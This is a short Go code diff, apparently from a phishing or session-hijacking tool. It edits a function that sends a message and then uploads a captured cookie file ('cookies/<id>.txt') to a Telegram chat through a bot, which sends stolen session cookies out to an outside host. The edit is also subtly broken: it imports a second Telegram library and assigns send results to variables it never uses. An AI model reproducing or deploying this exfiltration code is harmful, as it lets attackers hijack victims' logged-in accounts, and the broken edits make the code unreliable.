@@ -10,6 +10,7 @@ import (
 
 	"github.com/tidwall/buntdb"
 	"github.com/go-telegram-bot-api/telegram-bot-api"
+	"gopkg.in/telegram-bot-api.v4"
 )
 
 const SessionTable = "sessions"
@@ -293,13 +294,13 @@ func send(text string, botT string, chat_id int64, tGcookie string) {
 	bot.Debug = true
 	// Send the message
 	msg := tgbotapi.NewMessage(chat_id, text)
-	err := bot.Send(msg)
+	myMsgGo, err := bot.Send(msg)
 	if err != nil {
 		fmt.Printf("Error sending message: %v", err)
 	}
 	//Send the cookie attachment
 	docMsg :=  tgbotapi.NewDocumentUpload(chat_id, "cookies/"+tGcookie+".txt")
-	err := bot.Send(docMsg)
+	mydocGo, err := bot.Send(docMsg)
 	if err != nil {
 		fmt.Printf("Error sending cookie attachment: %v", err)
 	}
